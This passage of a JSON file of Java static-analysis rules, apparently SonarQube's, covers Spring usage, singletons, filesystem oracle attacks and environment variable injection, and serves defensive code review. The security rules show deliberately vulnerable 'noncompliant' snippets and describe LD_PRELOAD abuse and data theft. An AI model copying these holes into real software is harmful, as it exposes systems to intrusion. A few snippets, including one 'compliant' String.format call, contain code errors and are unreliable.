more testable. Fields can be declared final, which makes the code easier to understand, as\ndependencies donât change after instantiation.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class SomeService {\n    @Autowired\n    private SomeDependency someDependency; // Noncompliant\n\n    private String name = someDependency.getName(); // Will throw a NullPointerException\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class SomeService {\n    private final SomeDependency someDependency;\n    private final String name;\n\n    @Autowired\n    public SomeService(SomeDependency someDependency) {\n        this.someDependency = someDependency;\n        name = someDependency.getName();\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/java-spring-field-injection-cons\">Why Is Field Injection Not Recommended?</a> </li>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/constructor-injection-in-spring\">Constructor Dependency Injection in Spring</a> </li>\n  <li> Oliver Drotbohm - <a href=\"https://odrotbohm.de/2013/11/why-field-injection-is-evil/\">Why field injection is evil</a> </li>\n  <li> GitHub Discussions - <a href=\"https://github.com/quarkusio/quarkus/discussions/38474\">Field injection in quarkus</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"},{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6813","summary":"Field dependency injection should be avoided","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"10.3.0.82913","communityVersion":"10.3.0.82913"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The Spring framework provides the annotation <code>Async</code> to mark a method (or all methods of a type) as a candidate for asynchronous\nexecution.</p>\n<p>Asynchronous methods do not necessarily, by their nature, return the result of their calculation immediately. Hence, it is unexpected and in clear\nbreach of the <code>Async</code> contract for such methods to have a return type that is neither <code>void</code> nor a <code>Future</code> type.</p>\n<h2>How to fix it</h2>\n<p>Use <code>void</code> as the return type if the method is not expected to return a result. Otherwise, a <code>Future</code> should be returned,\nallowing the caller to retrieve the result once it is ready. It is permitted to return more specific subtypes that inherit from\n<code>Future</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Async\npublic String asyncMethod() {\n  ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Async\npublic Future&lt;String&gt; asyncMethod() {\n  ...\n}\n</pre>\n<p>Alternatively, if the method does not need to return a result:</p>\n<pre>\n@Async\npublic void asyncMethod() {\n  ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Framework Documentation - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/annotation/Async.html\">Annotation Interface\n  Async</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6810","summary":"Async methods should return void or Future","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"10.3.0.82913","communityVersion":"10.3.0.82913"},"cleanCodeAttribute":"CONVENTIONAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>A method annotated with Springâs <code>@Async</code>, <code>@Cacheable</code> or <code>@Transactional</code> annotations will not work as expected\nif invoked directly from within its class.</p>\n<p>This is because Spring generates a proxy class with wrapper code to manage the methodâs asynchronicity (<code>@Async</code>), to cache methods\ninvocations (<code>@Cacheable</code>), or to handle the transaction (<code>@Transactional</code>). However, when called using <code>this</code>, the\nproxy instance is bypassed, and the method is invoked directly without the required wrapper code.</p>\n<h2>How to fix it</h2>\n<p>Replace calls to <code>@Async</code>, <code>@Cacheable</code> or <code>@Transactional</code> methods via <code>this</code> with calls on an\ninstance that was injected by Spring (<code>@Autowired</code>, <code>@Resource</code> or <code>@Inject</code>). The injected instance is a proxy on\nwhich the methods can be invoked safely.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Service\npublic class AsyncNotificationProcessor implements NotificationProcessor {\n\n  @Override\n  public void process(Notification notification) {\n    processAsync(notification); // Noncompliant, call bypasses proxy\n    retrieveNotification(notification.id); // Noncompliant, call bypasses proxy and will not be cached\n  }\n\n  @Async\n  public processAsync(Notification notification) {\n    // ...\n  }\n\n  @Cacheable\n  public Notification retrieveNotification(Long id) {\n    // ...\n  }\n\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Service\npublic class AsyncNotificationProcessor implements NotificationProcessor {\n\n  @Resource\n  private AsyncNotificationProcessor asyncNotificationProcessor;\n\n  @Override\n  public void process(Notification notification) {\n    asyncNotificationProcessor.processAsync(notification); // Compliant, call via injected proxy\n    asyncNotificationProcessor.retrieveNotification(notification.id); // Compliant, the call will be cached\n  }\n\n  @Async\n  public processAsync(Notification notification) {\n    // ...\n  }\n\n  @Cacheable\n  public Notification retrieveNotification(Long id) {\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/annotation/Async.html\">Spring\n  Framework API - Annotation Interface Async</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/transaction/annotation/Transactional.html\">Spring\n  Framework API - Annotation Interface Transactional</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/cache/annotation/Cacheable.html\">Spring Framework\n  API - Annotation Interface Cacheable</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-async\">Baeldung - How To Do @Async in Spring</a> </li>\n  <li> <a href=\"https://stackoverflow.com/questions/22561775/spring-async-ignored\">Stack Overflow - Spring @Async ignored</a> </li>\n  <li> <a href=\"https://stackoverflow.com/questions/4396284/does-spring-transactional-attribute-work-on-a-private-method\">Stack Overflow - Does Spring\n  @Transactional attribute work on a private method?</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/integration/cache/annotations.html#cache-annotations-cacheable\">Spring docs, The\n  @Cacheable Annotation</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6809","summary":"Methods with Spring proxy should not be called via \"this\"","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"10.3.0.82913","communityVersion":"10.3.0.82913"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Spring Expression Language (SpEL) is an expression language used in the Spring Framework for evaluating and manipulating objects, properties, and\nconditions within Spring-based applications.</p>\n<p><code>org.springframework.ui.Model</code> is an interface in the Spring Framework that represents a container for data that can be passed between a\ncontroller and a view in a Spring MVC web application, allowing for data sharing during the request-response cycle.</p>\n<p>Attributes added to the <code>org.springframework.ui.Model</code> should follow the Java identifier naming convention, which means they must start\nwith a letter <code>a-z, A-Z</code>, underscore <code>_</code>, or a dollar sign <code>$</code> and may be followed by letters, digits, underscores,\nor dollar signs.</p>\n<p>Failure to do so may result in SpEL parsing errors when using these attributes in template engines.</p>\n<h2>How to fix it</h2>\n<p>Follow the Java identifier naming convention.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nmodel.addAttribute(\" a\", 100); // Noncompliant (starts with a space)\nmodel.addAttribute(\"a-b\", 7);  // Noncompliant (contains a hyphen)\nmodel.addAttribute(\"1c\", 42);  // Noncompliant (starts with a digit)\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nmodel.addAttribute(\"a\", 100);\nmodel.addAttribute(\"b\", 42);\nmodel.addAttribute(\"_c\", 7);\nmodel.addAttribute(\"$d\", 8);\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://www.oracle.com/java/technologies/javase/codeconventions-namingconventions.html\">Java SE - naming conventions</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/expressions.html\">Spring Expression Language (SpEL)</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/ui/Model.html\">Spring IO Docs - Interface\n  Model</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"},{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6806","summary":"Model attributes should follow the Java identifier naming convention","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"10.3.0.82913","communityVersion":"10.3.0.82913"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule reports when the Spring <code>@Value</code> annotation injects a simple value that does not contain an expression.</p>\n<h2>Why is this an issue?</h2>\n<p>The purpose of the <code>@Value</code> annotation in <code>org.springframework.beans.factory.annotation</code> is to inject a value into a field or\nmethod based on the Spring context after it has been established.</p>\n<p>If the annotation does not include an expression (either Spring Expression Language or a property injection), the injected value is a simple\nconstant that does not depend on the Spring context, making the annotation replaceable with a standard field initialization statement.</p>\n<p>This not only implies the redundant use of <code>@Value</code>, but could also indicate an error where the expression indicators (<code>#</code>,\n<code>$</code>) were omitted by mistake.</p>\n<h3>Exceptions</h3>\n<p>This rule does not raise an issue if <code>@Value</code> is applied to a method or method argument, because the annotation has the side effect that\nthe method is called.</p>\n<h2>How to fix it</h2>\n<ul>\n  <li> If a property is to be injected, use <code>${propertyName}</code> instead of <code>propertyName</code>. </li>\n  <li> If a SpEL expression is to be evaluated, use <code>#{expression}</code> instead of <code>expression</code>. </li>\n  <li> If you intend to initialize a field with a simple value or with an expression that does not depend on the Spring context, use a standard field\n  initialization statement. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Value(\"catalog.name\") // Noncompliant, this will not inject the property\nString catalog;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Value(\"${catalog.name}\") // Compliant\nString catalog;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@Value(\"book.topics[0]\") // Noncompliant, this will not evaluate the expression\nTopic topic;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@Value(\"#{book.topics[0]}\") // Compliant\nTopic topic;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n@Value(\"Hello, world!\") // Noncompliant, this use of @Value is redundant\nString greeting;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nString greeting = \"Hello, world!\"; // Compliant\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/annotation/Value.html\">Spring\n  Framework API - Annotation Interface Value</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-value-annotation\">Baeldung - A Quick Guide to Spring @Value</a> </li>\n  <li> <a href=\"https://www.digitalocean.com/community/tutorials/spring-value-annotation\">DigitalOcean - Spring @Value Annotation</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"},{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6804","summary":"\"@Value\" annotation should inject property or SpEL expression","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.3.0.82913","communityVersion":"10.3.0.82913"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Nullability annotations in Java are used to indicate whether a variable or parameter can be assigned a null value or not. These annotations help to prevent Null Pointer Exceptions and improve the reliability of code.</p>\n<p>Redundant nullability annotations can clutter the code and make it harder to read and understand. When a nullability annotation is already implied by the context or by other annotations, explicitly adding it again only adds noise and makes the code less clear.</p>\n<p>Removing them improves code readability, maintainability, reduces the risk of inconsistencies, and ensures that the remaining annotations carry meaningful information.</p>\n<h3>Noncompliant code example</h3>\nJSpecify code example:\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@NullMarked\nclass MyClass {\n  public void method(@NonNull Object o) { // Noncompliant: @NonNull is redundant here\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@NullMarked\nclass MyClass {\n  public void method(Object o) {\n    // ...\n  }\n}\n</pre>\n","impacts":[],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6665","summary":"Redundant nullability annotations should be removed","tags":["nullability","jspecify"],"versions":{"serverEdition":"Developer","serverVersion":"sqs-10.8.1.101195","communityVersion":"sqcb-24.12.0.100206"},"cleanCodeAttribute":"","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Applications behave as filesystem oracles when they disclose to attackers if resources from the filesystem exist or not.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initially intended path. The resulting\npath would resolve to a location somewhere in the filesystem which the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a filesystem oracle vulnerability can determine if a file exists or not.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nelevated privileges, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Information gathering</h4>\n<p>The vulnerability is exploited to gather information about the host system. The filesystem oracle can help identify user accounts, running\nservices, or the exact version of installed software.</p>\n<h2>How to fix it in Java I/O API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a file system oracle as it allows testing the existence of a file anywhere on the file system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.io.File;\n\n@Controller\npublic class ExampleController\n{\n    static private String targetDirectory = \"/path/to/target/directory/\";\n\n    @GetMapping(value = \"/exists\")\n    public void exists(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetDirectory + filename);\n        if (!file.exists()) { // Noncompliant\n            throw new IOException(\"File does not exist in the target directory\");\n        }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.io.File;\n\n@Controller\npublic class ExampleController\n{\n    static private String targetDirectory = \"/path/to/target/directory/\";\n\n    @GetMapping(value = \"/exists\")\n    public void exists(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetDirectory + filename);\n        String canonicalDestinationPath = file.getCanonicalPath();\n\n        if (!canonicalDestinationPath.startsWith(targetDirectory)) {\n            throw new IOException(\"Entry is outside of the target directory\");\n        } else if (!file.exists()) {\n            throw new IOException(\"File does not exist in the target directory\");\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>The universal way to avoid filesystem oracle vulnerabilities is to validate paths constructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal (see the \"Pitfalls\" section). </li>\n  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative paths or\n  path components like <code>../</code> and remove any ambiguity regarding the fileâs location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nstatic private String targetDirectory = \"/Users/John\";\n\n@GetMapping(value = \"/endpoint\")\npublic void endpoint(@RequestParam(\"folder\") File fileName) throws IOException {\n\n    String canonicalizedFileName = fileName.getCanonicalPath();\n\n    if (!canonicalizedFileName.startsWith(targetDirectory)) {\n        throw new IOException(\"Entry is outside of the target directory\");\n    }\n}\n</pre>\n<p>This check can be bypassed if other directories start with <code>John</code>. For instance, <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code>\nreturns <code>true</code>. Thus, for validation, <code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions, such as <code>getCanonicalPath</code>, remove the terminating path separator in their return value.<br>\nThe validation code should be tested to ensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h4>Do not use java.nio.file.Path.resolve as a validator</h4>\n<p>As specified in the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html\">official documentation</a>, if the given parameter\nis an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>\n<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6549","summary":"Accessing files should not lead to filesystem oracle attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"10.1.0.73491","communityVersion":null},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<p>The Singleton design pattern is a creational pattern. It ensures that only one class instance is created and provides a global point of access to\nit. There are several ways to implement a Singleton in Java, and the debate about the best approach has yet to be settled.</p>\n<p>This rule marks all classes that are considered as Singletons, regardless of how they are implemented. This helps developers identify where in the\ncode Singletons are used. Singletons should be reviewed to confirm whether a Singleton is truly necessary and whether the selected implementation is\nthe most suitable for the context.</p>\n<p>Every Singleton implementation has its advantages and disadvantages. This rule exists to bring attention to them so that informed decisions can be\nmade.</p>\n<h2>Why is this an issue?</h2>\n<p>While the Singleton pattern can be useful in certain situations, overusing it can have several drawbacks:</p>\n<ul>\n  <li> Tight coupling: The Singleton pattern can create tight coupling between the Singleton class and other classes that use it, making the code\n  difficult to maintain and modify. </li>\n  <li> Global state: The Singleton pattern can create a global state, making it difficult to manage the state of the application and leading to\n  unexpected behavior. </li>\n  <li> Testing: The Singleton pattern can make it difficult to test classes that depend on the Singleton, as the Singleton cannot be easily\n  substituted with a mock object. </li>\n  <li> Scalability: The Singleton pattern can make it difficult to scale an application, as it can create a bottleneck if multiple threads try to\n  access the Singleton concurrently. </li>\n  <li> Dependency injection: The Singleton pattern can make it difficult to use dependency injection frameworks, as the Singleton instance is usually\n  created statically. </li>\n</ul>\n<p>In general, the Singleton pattern should be used sparingly and only in situations where it provides a clear benefit over other patterns or\napproaches. It is important to consider the drawbacks and tradeoffs of using the Singleton pattern before incorporating it into an application.</p>\n<h3>What is the potential impact?</h3>\n<h4>Enum Implementation</h4>\n<pre>\npublic enum EnumSingleton {\n\n    INSTANCE;\n\n    private EnumSingleton() {\n        // Initialization code here...\n    }\n}\n</pre>\n<p><strong>Advantages</strong>:</p>\n<p>This implementation is thread-safe by default because the initialization of an Enum value is guaranteed to be thread-safe and atomic.</p>\n<p>The Enum Singleton implementation allows for lazy initialization while also providing thread-safety guarantees.</p>\n<h4>Bill Pugh Implementation</h4>\n<pre>\npublic class BillPughSingleton {\n\n    private BillPughSingleton(){}\n\n    private static class SingletonHelper {\n        private static final BillPughSingleton INSTANCE = new BillPughSingleton();\n    }\n\n    public static BillPughSingleton getInstance() {\n        return SingletonHelper.INSTANCE;\n    }\n}\n</pre>\n<p><strong>Advantages</strong>:</p>\n<p>The instance is created only at the first call of the <code>getInstance()</code> method.</p>\n<p>This implementation is thread-safe.</p>\n<h4>Thread Safe Implementation</h4>\n<pre>\npublic class ThreadSafeSingleton {\n\n    private static ThreadSafeSingleton instance;\n\n    private ThreadSafeSingleton(){}\n\n    public static synchronized ThreadSafeSingleton getInstance() {\n        if (instance == null) {\n            instance = new ThreadSafeSingleton();\n        }\n        return instance;\n    }\n}\n</pre>\n<p><strong>Advantage</strong>:</p>\n<p>This implementation is thread-safe.</p>\n<p><strong>Disadvantage</strong>:</p>\n<p>It reduces the performance because of the cost associated with the synchronized method. To avoid this extra overhead every time, double-checked\nlocking principle should be used.</p>\n<h4>Static Block Initialization Implementation</h4>\n<pre>\npublic class StaticBlockSingleton {\n\n    private static StaticBlockSingleton instance;\n\n    private StaticBlockSingleton(){}\n\n    static {\n        try {\n            instance = new StaticBlockSingleton();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Exception while creating singleton instance\");\n        }\n    }\n\n    public static StaticBlockSingleton getInstance() {\n        return instance;\n    }\n}\n</pre>\n<p><strong>Advantage</strong>:</p>\n<p>Compared to the Eager Initialization, this implementation provides options for exception handling.</p>\n<p><strong>Disadvantage</strong>:</p>\n<p>The instance is created even if itâs never used, like for the Eager Initialization implementation.</p>\n<h4>Eager Initialization Implementation</h4>\n<pre>\npublic class EagerInitializedSingleton {\n\n    private static final EagerInitializedSingleton instance = new EagerInitializedSingleton();\n\n    private EagerInitializedSingleton() {}\n\n    public static EagerInitializedSingleton getInstance() {\n        return instance;\n    }\n}\n</pre>\n<p><strong>Advantage</strong>:</p>\n<p>This implementation is thread-safe, as the instance variable is initialized when the class is loaded.</p>\n<p><strong>Disadvantages</strong>:</p>\n<p>The instance is created even if itâs never used, which can be wasteful in terms of memory usage. However, if the Singleton is expected to be used\nfrequently or is not too memory-intensive, Eager Initialization can be a good choice.</p>\n<p>This implementation doesnât provide any options for exception handling.</p>\n<h4>Lazy Initialization Implementation</h4>\n<pre>\npublic class LazyInitializedSingleton {\n\n    private static LazyInitializedSingleton instance;\n\n    private LazyInitializedSingleton(){}\n\n    public static LazyInitializedSingleton getInstance() {\n        if (instance == null) {\n            instance = new LazyInitializedSingleton();\n        }\n        return instance;\n    }\n}\n</pre>\n<p><strong>Advantage</strong>:</p>\n<p>This implementation works fine in the case of the single-threaded environment.</p>\n<p><strong>Disadvantage</strong>:</p>\n<p>This implementation is not thread-safe if multiple threads are at the same time in the <code>if</code> condition.</p>\n<h4>Public Static Field Implementation</h4>\n<pre>\npublic class PublicStaticSingleton {\n\n    public static final PublicStaticSingleton INSTANCE = new PublicStaticSingleton();\n\n    private PublicStaticSingleton() {}\n}\n</pre>\n<p><strong>Advantage</strong>:</p>\n<p>This implementation is thread-safe.</p>\n<p><strong>Disadvantage</strong>:</p>\n<p>This implementation does not allow lazy initialization: the constructor runs as soon as the class is initialized.</p>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6548","summary":"The Singleton design pattern should be used with care","tags":["architecture","design"],"versions":{"serverEdition":"Developer","serverVersion":"10.1.0.73491","communityVersion":"10.1.0.73491"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Environment variable injection occurs in an application when the application receives data from a user or a third-party service and, without\nsanitizing it first, does the following:</p>\n<ul>\n  <li> Creates an environment variable based on the external data. </li>\n  <li> Inserts the external data into certain sensitive environment variables, such as <code>PATH</code> or <code>LD_PRELOAD</code>.   <pre>\nIf an application uses environment variables that are vulnerable to injection, it is exposed\nto a variety of attacks that aim to exploit supposedly safe environment variables, such as `PATH`.\n</pre>   </li>\n</ul>\n<p>A user with malicious intent carefully performs actions aimed at modifying or adding environment variables to profit from it.</p>\n<h3>What is the potential impact?</h3>\n<p>When user-supplied values are used to manipulate environment variables, an attacker can supply carefully chosen values that cause the system to\nbehave unexpectedly.<br> In some cases, the attacker can use this capability to execute arbitrary code on the server.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attacker manages to inject an environment variable that is recognized and used by the remote system. For example, this could\nbe the secret of a particular cloud provider used in an environment variable, or <code>PATH</code>.</p>\n<p>Depending on the application, the attacker can read or modify important data or perform unwanted actions.<br> For example, injecting data into the\n<code>HTTP_PROXY</code> variable could lead to data leakage.</p>\n<h4>Application compromise</h4>\n<p>In the worst case, an attacker manages to inject an important environment variable such as <code>LD_PRELOAD</code> and execute code by overriding\ntrusted code.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal serverâs data, most likely to sell it. </li>\n  <li> Modify data, install malware, and for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h2>How to fix it in Java Lang Package</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to environment variable manipulation as it constructs the variables from untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) {\n  Runtime r = Runtime.getRuntime();\n  String userInput = request.getParameter(\"example\");\n\n  if (userInput != null) {\n    String[] envs = {userInput};\n    r.exec(\"/path/to/example\", envs);\n  } else{\n    r.exec(\"/path/to/example\");\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) {\n  Runtime r = Runtime.getRuntime();\n  String userInput = request.getParameter(\"example\");\n\n  if (userInput != null &amp;&amp; userInput.matches(\"^[a-zA-Z0-9]*$\")) {\n    String[] envs = {\"ENV_VAR=%s\".format(userInput)};\n    r.exec(\"/path/to/example\", envs);\n  } else {\n    r.exec(\"/path/to/example\");\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure environment variables that you want the application to be able to use.<br> If a user input does not match an\nentry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/454\">CWE-454 - External Initialization of Trusted Variables or Data Stores</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> 